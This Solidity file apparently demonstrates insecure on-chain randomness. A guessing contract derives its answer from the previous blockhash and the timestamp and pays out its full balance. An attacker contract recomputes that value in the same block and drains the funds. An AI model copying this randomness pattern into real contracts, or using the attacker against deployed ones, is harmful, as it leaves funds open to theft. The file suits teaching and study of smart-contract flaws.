// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

contract InsecureRandomness {
    constructor() payable { }

    function guess(uint256 _guess, address _receiver) public {
        //uint256 randomNumber = uint256(keccak256(abi.encodePacked(block.number,
        // block.timestamp)));
        uint256 answer =
            uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)));

        if (_guess == answer) {
            (bool sent,) = _receiver.call{ value: address(this).balance }("");
            require(sent, "Failed to send Ether");
        }
    }

    receive() external payable { }
}

contract InsecureRandomnessAttacker {
    InsecureRandomness vulnerable;

    constructor(InsecureRandomness _vulnerable) {
        vulnerable = _vulnerable;
    }

    // Guess the correct number to win the entire contract's balance.
    function attack() public payable {
        // Just copy the guess function logic from the vulnerable contract
        // since they are both executed in the same block.
        uint256 answer =
            uint256(keccak256(abi.encodePacked(blockhash(block.number - 1), block.timestamp)));
        vulnerable.guess(answer, msg.sender);
    }

    // Receive function triggers the attack.
    receive() external payable { }
}
